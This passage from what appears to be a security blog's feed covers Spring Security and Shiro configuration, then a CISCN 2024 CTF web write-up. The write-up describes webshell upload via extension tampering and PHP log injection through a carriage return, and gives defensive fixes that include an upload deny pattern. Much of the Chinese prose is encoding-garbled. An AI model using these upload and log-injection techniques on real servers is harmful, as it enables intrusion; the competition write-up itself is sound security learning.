class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="å¿½ç•¥æ‹¦æˆª"><a href="#å¿½ç•¥æ‹¦æˆª" class="headerlink" title="å¿½ç•¥æ‹¦æˆª"></a>å¿½ç•¥æ‹¦æˆª</h3><p>å¦‚æœæŸä¸€ä¸ªè¯·æ±‚åœ°å€ä¸éœ€è¦æ‹¦æˆªçš„è¯ï¼Œæœ‰ä¸¤ç§æ–¹å¼å®ç°ï¼š</p><ul><li><p>è®¾ç½®è¯¥åœ°å€åŒ¿åè®¿é—®</p></li><li><p>ç›´æ¥è¿‡æ»¤æ‰è¯¥åœ°å€ï¼Œå³è¯¥åœ°å€ä¸èµ° Spring Security è¿‡æ»¤å™¨é“¾</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">WebSecurity</span> web<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        web<span class="token punctuation">.</span><span class="token function">ignoring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/vercode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><blockquote><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§çµæ´»çš„å¼€æºæ¡†æ¶ï¼Œå¯ä»¥å®Œå…¨å¤„ç†èº«ä»½éªŒè¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†</p></blockquote><p>å‚è€ƒï¼š<a href="https://drun1baby.top/2022/07/07/Java%E5%BC%80%E5%8F%91%E4%B9%8Bshiro%E5%AD%A6%E4%B9%A0">https://drun1baby.top/2022/07/07/Java%E5%BC%80%E5%8F%91%E4%B9%8Bshiro%E5%AD%A6%E4%B9%A0</a></p><p>åŠŸèƒ½ï¼š</p><ul><li><strong>Authenticationï¼ˆè®¤è¯ï¼‰ï¼š</strong>ç”¨æˆ·èº«ä»½è¯†åˆ«ï¼Œé€šå¸¸è¢«ç§°ä¸ºç”¨æˆ·â€œç™»å½•â€</li><li><strong>Authorizationï¼ˆæˆæƒï¼‰ï¼š</strong>è®¿é—®æ§åˆ¶ã€‚æ¯”å¦‚æŸä¸ªç”¨æˆ·æ˜¯å¦å…·æœ‰æŸä¸ªæ“ä½œçš„ä½¿ç”¨æƒé™ã€‚</li><li><strong>Session Managementï¼ˆä¼šè¯ç®¡ç†ï¼‰ï¼š</strong>ç‰¹å®šäºç”¨æˆ·çš„ä¼šè¯ç®¡ç†ï¼Œç”šè‡³åœ¨é Web æˆ– EJB åº”ç”¨ç¨‹åºã€‚</li><li><strong>Cryptographyï¼ˆåŠ å¯†ï¼‰ï¼š</strong>åœ¨å¯¹æ•°æ®æºä½¿ç”¨åŠ å¯†ç®—æ³•åŠ å¯†çš„åŒæ—¶ï¼Œä¿è¯æ˜“äºä½¿ç”¨ã€‚</li></ul><p>Shiro æ¶æ„åŒ…å«ä¸‰ä¸ªä¸»è¦çš„ç†å¿µï¼š</p><ul><li>Subjectï¼šå½“å‰ç”¨æˆ·ï¼ŒSubject å¯ä»¥æ˜¯ä¸€ä¸ªäººï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯ç¬¬ä¸‰æ–¹æœåŠ¡ã€å®ˆæŠ¤è¿›ç¨‹å¸æˆ·ã€æ—¶é’Ÿå®ˆæŠ¤ä»»åŠ¡æˆ–è€…å…¶å®ƒâ€“å½“å‰å’Œè½¯ä»¶äº¤äº’çš„ä»»ä½•äº‹ä»¶ã€‚ä¸€èˆ¬ Subject è¿™é‡Œæ˜¯è¿å‰ç«¯æ•°æ®çš„ã€‚</li><li>SecurityManagerï¼šç®¡ç†æ‰€æœ‰ Subjectï¼ŒSecurityManager æ˜¯ Shiro æ¶æ„çš„æ ¸å¿ƒï¼Œé…åˆå†…éƒ¨å®‰å…¨ç»„ä»¶å…±åŒç»„æˆå®‰å…¨ä¼ã€‚</li><li>Realmsï¼šç”¨äºè¿›è¡Œæƒé™ä¿¡æ¯çš„éªŒè¯ï¼Œæˆ‘ä»¬è‡ªå·±å®ç°ã€‚Realm æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç‰¹å®šçš„å®‰å…¨ DAOï¼šå®ƒå°è£…ä¸æ•°æ®æºè¿æ¥çš„ç»†èŠ‚ï¼Œå¾—åˆ°  Shiro æ‰€éœ€çš„ç›¸å…³çš„æ•°æ®ã€‚åœ¨é…ç½® Shiro çš„æ—¶å€™ï¼Œä½ å¿…é¡»æŒ‡å®šè‡³å°‘ä¸€ä¸ª Realm  æ¥å®ç°è®¤è¯ï¼ˆauthenticationï¼‰å’Œ&#x2F;æˆ–æˆæƒï¼ˆauthorizationï¼‰ã€‚</li></ul><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>pom.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.shiro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>shiro-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.4.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!-- configure logging --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jcl-over-slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.21<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>slf4j-log4j12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.21<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å¼€å‘ä¸å®‰å…¨ç¼ºä¸€ä¸å¯ï¼Œè™½ç„¶ä¸çŸ¥é“è‡ªå·±åˆ°åº•å°‘å­¦äº†å¤šå°‘åŸºç¡€ï¼Œä½†æ˜¯ç°åœ¨å°±å…ˆè·Ÿç€&lt;a href=&quot;https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file&quot;&gt;Drun1babyçš„å­¦ä¹ è·¯çº¿&lt;/a&gt;å§&lt;/p&gt;
&lt;p&gt;javaç¬¬ä¸€æ­¥ï¼Œå…ˆå­¦SpringBootï¼ŒåŒæ—¶æˆ‘è¿™é‡Œä¹Ÿä¼šç¨å¾®å­¦ä¸€ä¸‹Springå’ŒSpringMVC&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1PE411i7CV&quot;&gt;https://www.bilibili.com/video/BV1PE411i7CV&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf&quot;&gt;https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/06/28/SpringBoot/image-20240628122350310.png&quot; alt=&quot;image-20240628122350310&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Basic" scheme="http://c1oudfl0w0.github.io/blog/categories/Basic/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCNåä¸œå—åˆ†åŒºèµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/</id>
    <published>2024-06-23T01:03:08.000Z</published>
    <updated>2024-08-09T12:58:36.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>âš çƒ­å¼‚å¸¸âš </p><p>åŠçš„å¾ˆå¥½ï¼Œä¸‹æ¬¡åˆ«åœ¨fjnuåŠäº†ï¼Œåˆ‡å‰²äº†ï¼ˆï¼ˆ</p><p><del>ç°åœ¨æ˜¯6æœˆ23å·æ—©ä¸Šçš„8ç‚¹36ï¼Œæ˜ŸæœŸå¤©ï¼›24å·ï¼Œé«˜ç­‰æ•°å­¦ï¼Œï¼ˆå·®ï¼‰ä¸€ç« æ²¡çœ‹ï¼Œ27å·ï¼Œæ¦‚ç‡è®ºï¼Œè¿˜è¡Œï¼Œè¿˜å‰©é¢˜æ²¡åšâ€¦æ¬¸è¿™èŒ¶æ­‡ä¸œè¥¿è¿˜æŒºå¤šww</del></p><p>æ˜¯webçš„wp</p><p>ç”±æˆ‘å’Œ@Laffeyå…±åŒå®Œæˆï¼Œä¸ªäººå¯¹webçš„è¯„ä»·æ˜¯çº¯æ‹¼ç§¯ç´¯ï¼Œçº¿ä¸‹æ–­ç½‘æƒ…å†µä¸‹æœ‰ä¸€ä¸ªè‡ªå·±çš„æœ¬åœ°åšå®¢å¤ªé‡è¦äº†ï¼Œç„¶åå°±æ˜¯è€èµ›æ£é­…åŠ›æ—¶åˆ»ï¼ˆ</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165857174.png" alt="image-20240623165857174"></p><span id="more"></span><hr><h1 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h1><p>ctrl+u</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623090909287.png" alt="image-20240623090909287"></p><hr><h1 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h1><h2 id="BREAK"><a href="#BREAK" class="headerlink" title="BREAK"></a>BREAK</h2><p>æœåŠ¡å™¨ä¸çŸ¥é“æ£€æŸ¥äº†ä»€ä¹ˆä¸œè¥¿ï¼Œç›´æ¥burpæ”¹åç¼€ä¼ é©¬</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623164803273.png" alt="image-20240623164803273"></p><h2 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h2><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623164921584.png" alt="image-20240623164921584"></p><p>å¯¹æ–‡ä»¶åç¼€åä½œç™½åå•å¤„ç†ï¼Œç„¶åå¯¹æ–‡ä»¶å†…å®¹çš„è¿‡æ»¤å¤šä¸€ä¸ªphpæ–‡ä»¶å¼€å§‹æ ‡è¯†ç¬¦</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// $path = "./uploads";</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./uploads"</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"åªå…è®¸pngå“¦!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$allow_content_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"myfile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$allow_content_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"åªå…è®¸pngå“¦!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(&lt;\?|php|script|xml|user|htaccess)/i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// echo "åŒ¹é…æˆåŠŸ!";</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'é¼ é¼ è¯´ä½ çš„å†…å®¹ä¸ç¬¦åˆå“¦0-0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Success!&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Error!&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç²—å¿ƒçš„ç¨‹åºå‘˜"><a href="#ç²—å¿ƒçš„ç¨‹åºå‘˜" class="headerlink" title="ç²—å¿ƒçš„ç¨‹åºå‘˜"></a>ç²—å¿ƒçš„ç¨‹åºå‘˜</h1><h2 id="BREAK-1"><a href="#BREAK-1" class="headerlink" title="BREAK"></a>BREAK</h2><p>æ‰«ç›®å½•å‘ç°æœ‰æºç æ³„éœ²ã€‚</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165059136.png" alt="image-20240623165059136"></p><p>å±…ç„¶æ•¢å†™æ—¥å¿—åœ¨phpæ–‡ä»¶é‡Œé¢ã€‚</p><p>åªæŠŠæ¢è¡Œç¬¦ç»™è¿‡æ»¤äº†(\n)ï¼Œæ²¡è¿‡æ»¤å›è½¦(\r)ã€‚</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165123023.png" alt="image-20240623165123023"></p><p>ç„¶åè®¿é—®ä¸€æ¬¡home.phpï¼Œå†å»config.phpã€‚</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165150741.png" alt="image-20240623165150741"></p><h2 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h2><p>ç›´æ¥æŠŠå†™æ—¥å¿—çš„æ“ä½œåˆ æ‰ã€‚</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165240719.png" alt="image-20240623165240719"></p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phperror_reporting(0);include &quot;default_info_auto_recovery.php&quot;;session_start();$username &#x3D; $_SESSION[&#39;username&#39;];$id &#x3D; $_SESSION[&#39;id&#39;];if ($username &amp;&amp; $id) &#123;echo &quot;Hello,&quot; . &quot;$username&quot;;&#125; else &#123;die(&quot;NO ACCESS&quot;);&#125;?&gt;&lt;br&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;jquery-1.9.0.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;jquery.base64.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;function submitData() &#123;var obj &#x3D; new Object();obj.name &#x3D; $(&#39;#newusername&#39;).val();var str &#x3D;$.base64.encode(JSON.stringify(obj.name).replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;\&quot;&quot;, &quot;&quot;));$.post(&quot;edit.php&quot;, &#123;newusername: str&#125;,function(str) &#123;alert(str);location.reload()&#125;);&#125;jQuery.base64 &#x3D; (function($) &#123;var keyStr &#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&quot;;function utf8Encode(string) &#123;string &#x3D; string.replace(&#x2F;\r\n&#x2F;g, &quot;\n&quot;);var utftext &#x3D; &quot;&quot;;for (var n &#x3D; 0; n &lt; string.length; n++) &#123;var c &#x3D; string.charCodeAt(n);if (c &lt; 128) &#123;utftext +&#x3D; String.fromCharCode(c);&#125; else if ((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123;utftext +&#x3D; String.fromCharCode((c &gt;&gt; 6) | 192);utftext +&#x3D; String.fromCharCode((c &amp; 63) | 128);&#125; else &#123;utftext +&#x3D; String.fromCharCode((c &gt;&gt; 12) | 224);utftext +&#x3D; String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128);utftext +&#x3D; String.fromCharCode((c &amp; 63) | 128);&#125;&#125;return utftext;&#125;function encode(input) &#123;var output &#x3D; &quot;&quot;;var chr1, chr2, chr3, enc1, enc2, enc3, enc4;var i &#x3D; 0;input &#x3D; utf8Encode(input);while (i &lt; input.length) &#123;chr1 &#x3D; input.charCodeAt(i++);chr2 &#x3D; input.charCodeAt(i++);chr3 &#x3D; input.charCodeAt(i++);enc1 &#x3D; chr1 &gt;&gt; 2;enc2 &#x3D; ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);enc3 &#x3D; ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);enc4 &#x3D; chr3 &amp; 63;if (isNaN(chr2)) &#123;enc3 &#x3D; enc4 &#x3D; 64;&#125; else if (isNaN(chr3)) &#123;enc4 &#x3D; 64;&#125;output &#x3D; output +keyStr.charAt(enc1) + keyStr.charAt(enc2) +keyStr.charAt(enc3) + keyStr.charAt(enc4);&#125;return output;&#125;return &#123;encode: function(str) &#123;return encode(str);&#125;&#125;;&#125;(jQuery));&lt;&#x2F;script&gt;æ›´æ”¹ç”¨æˆ·å&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;newusername&quot; id&#x3D;&quot;newusername&quot; value&#x3D;&quot;&quot;&gt;&lt;button type&#x3D;&quot;submit&quot; onclick&#x3D;&quot;submitData()&quot;&gt;æ›´æ”¹&lt;&#x2F;button&gt;<span aria-hidden="true" 